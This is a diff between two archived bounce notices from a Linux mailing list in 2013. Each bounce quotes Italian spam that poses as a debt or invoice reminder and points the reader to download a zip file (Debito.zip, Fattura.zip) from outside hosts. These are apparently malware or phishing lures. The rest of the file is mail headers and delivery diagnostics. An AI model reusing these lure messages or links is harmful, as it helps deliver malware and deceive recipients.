@@ -1,13 +1,10 @@
-From: <postmaster-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org>
-Subject: Impossibile recapitare: Re: Hai un debito
-Date: Thu, 23 May 2013 11:32:30 +0200
-Message-ID: <38230.3593018607$1369305166@news.gmane.org>
-References: <02787582.29352450620436@rs203001.rs.hosteurope.de>
+From: Mail Delivery Subsystem <MAILER-DAEMON-+FdXWfMsQr8qCD4A3ffJzA@public.gmane.org>
+Subject: Returned mail: see transcript for details
+Date: Thu, 23 May 2013 23:38:34 +0200
+Message-ID: <201305232138.r4NLcYrf021714@alice.cesd.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============3920318024334977657=="
+Content-Type: multipart/mixed; boundary="===============8729688192291547306=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Language: it-IT
-In-Reply-To: <02787582.29352450620436-Y8mfmD5L7nkmgmZhDedOVmnb+bCGH2YMs0AfqQuZ5sE@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,117 +17,73 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============3920318024334977657==
+This is a MIME-encapsulated message
+
+--===============8729688192291547306==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="192c3cc3-7978-4bde-9918-b3cd77eb8e24"
-Content-Language: it-IT
+	boundary="r4NLcYrf021714.1369345114/alice.cesd.it"
 
---192c3cc3-7978-4bde-9918-b3cd77eb8e24
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+This is a MIME-encapsulated message
 
-Il recapito non =E8 riuscito per i seguenti destinatari o liste di distribu=
-zione:
+--r4NLcYrf021714.1369345114/alice.cesd.it
 
-castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org<mailto:castagnellov.castagnello=
-@romacinemafest.org>
-L'indirizzo di posta elettronica del destinatario non =E8 stato trovato nel=
- sistema di posta elettronica del destinatario. Non verranno effettuati ult=
-eriori tentativi di recapito del messaggio. Controllare l'indirizzo di post=
-a elettronica e provare a inviare di nuovo il messaggio oppure fornire il t=
-esto di diagnostica seguente all'amministratore di sistema.
+The original message was received at Thu, 23 May 2013 23:38:12 +0200
+from mecemail.com [176.61.140.236]
 
-________________________________
-Inviato da Microsoft Exchange Server 2007
+   ----- The following addresses had permanent fatal errors -----
+<lisa.scalbi-8F/3s5OHoH4@public.gmane.org>
+    (reason: Can't create output)
 
+   ----- Transcript of session follows -----
+procmail: Quota exceeded while writing "/var/spool/mail/lisa.scalbi"
+550 5.0.0 <lisa.scalbi-8F/3s5OHoH4@public.gmane.org>... Can't create output
 
-
-
-
-
-Informazioni di diagnostica per gli amministratori:
-
-Server di generazione: cinemaperroma.it
-
-castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org
-#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
-
-Intestazioni originali del messaggio:
-
-Received: from rs203001.rs.hosteurope.de (176.28.51.172) by
- fellini.cinemaperroma.it (192.168.1.253) with Microsoft SMTP Server id
- 8.1.436.0; Thu, 23 May 2013 11:32:30 +0200
-Received: from rs203001.rs.hosteurope.de (XkW-02-10 [176.28.51.172]) by
- rs203001.rs.hosteurope.de (mailer) with SMTP id Cd4n6ZTacyoE for
- <castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org>; Thu, 23 May 2013 11:32:28
- +0200
-Date: Thu, 23 May 2013 11:32:28 +0200
-From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Message-ID: <02787582.29352450620436-Y8mfmD5L7nkmgmZhDedOVmnb+bCGH2YMs0AfqQuZ5sE@public.gmane.org>
-To: <castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org>
-Subject: Re: Hai un debito
-MIME-Version: 1.0
-Content-Type: text/plain; charset=3D"utf-8"
-Content-Transfer-Encoding: 8bit
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Received-SPF: Fail (fellini.cinemaperroma.it: domain of
- containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org does not designate 176.28.51.172 as
- permitted sender) receiver=3Dfellini.cinemaperroma.it;
- client-ip=3D176.28.51.172; helo=3Drs203001.rs.hosteurope.de;
-
-
---192c3cc3-7978-4bde-9918-b3cd77eb8e24
+--r4NLcYrf021714.1369345114/alice.cesd.it
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns;cinemaperroma.it
-Received-From-MTA: dns;rs203001.rs.hosteurope.de
-Arrival-Date: Thu, 23 May 2013 09:32:30 +0000
+Reporting-MTA: dns; alice.cesd.it
+Received-From-MTA: DNS; mecemail.com
+Arrival-Date: Thu, 23 May 2013 23:38:12 +0200
 
-Final-Recipient: rfc822;castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org
+Final-Recipient: RFC822; lisa.scalbi-8F/3s5OHoH4@public.gmane.org
+X-Actual-Recipient: RFC822; lisa.scalbi-+FdXWfMsQr8qCD4A3ffJzA@public.gmane.org
 Action: failed
-Status: 5.1.1
-Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
+Status: 5.3.0
+Diagnostic-Code: X-Unix; 73
+Last-Attempt-Date: Thu, 23 May 2013 23:38:34 +0200
 
-
---192c3cc3-7978-4bde-9918-b3cd77eb8e24
+--r4NLcYrf021714.1369345114/alice.cesd.it
 Content-Type: message/rfc822
 
-Received: from rs203001.rs.hosteurope.de (176.28.51.172) by
- fellini.cinemaperroma.it (192.168.1.253) with Microsoft SMTP Server id
- 8.1.436.0; Thu, 23 May 2013 11:32:30 +0200
-Received: from rs203001.rs.hosteurope.de (XkW-02-10 [176.28.51.172]) by
- rs203001.rs.hosteurope.de (mailer) with SMTP id Cd4n6ZTacyoE for
- <castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org>; Thu, 23 May 2013 11:32:28
- +0200
-Date: Thu, 23 May 2013 11:32:28 +0200
-From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Message-ID: <02787582.29352450620436-Y8mfmD5L7nkmgmZhDedOVmnb+bCGH2YMs0AfqQuZ5sE@public.gmane.org>
-To: <castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org>
-Subject: Re: Hai un debito
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from vps.server.com (mecemail.com [176.61.140.236])
+	by alice.cesd.it (8.12.10/8.12.10) with ESMTP id r4NLcBrf020831;
+	Thu, 23 May 2013 23:38:12 +0200
+Received: from [10.0.0.100] by vps.server.com id zAxuY3W78sQf; Thu, 23 May 2013 11:54:42 -0400
+Message-ID: <009701ce57cd$d4c64980$6400000a-jKCV79reoTC+XT7JhA+gdA@public.gmane.org>
+From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <lietti-8F/3s5OHoH4@public.gmane.org>
+Subject: Fwd: Hai presentato una fattura
+Date: Thu, 23 May 2013 11:54:42 -0400
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
+Content-type: text/plain; charset=us-ascii 
+X-Virus-Scanned: by amavisd-new
 Content-Transfer-Encoding: quoted-printable
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Received-SPF: Fail (fellini.cinemaperroma.it: domain of
- containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org does not designate 176.28.51.172 as
- permitted sender) receiver=fellini.cinemaperroma.it;
- client-ip=176.28.51.172; helo=rs203001.rs.hosteurope.de;
 
 
 
 
-Gentile utente, castagnellov.castagnello-bhJFsdc6ZlR7LRANw2Zqrh2eb7JE58TQ@public.gmane.org
-
-E emesso la fattura.
-Per informazioni complete, visitare l'indirizzo
-http://ftp.dekalogos.gr/Debito.zip
-
+Vi ricordiamo che avete un debito.
+Si deve essere rimborsato entro la fine della settimana, informazioni piu=
+ dettagliate sono disponibili all'indirizzo:
+http://www.ontario4u.com/Fattura.zip?id=3Dlietti.JcIDL5azD
 
 
 
---192c3cc3-7978-4bde-9918-b3cd77eb8e24--
+--r4NLcYrf021714.1369345114/alice.cesd.it--
 
---===============3920318024334977657==
+
+--===============8729688192291547306==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -140,4 +93,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============3920318024334977657==--
+--===============8729688192291547306==--
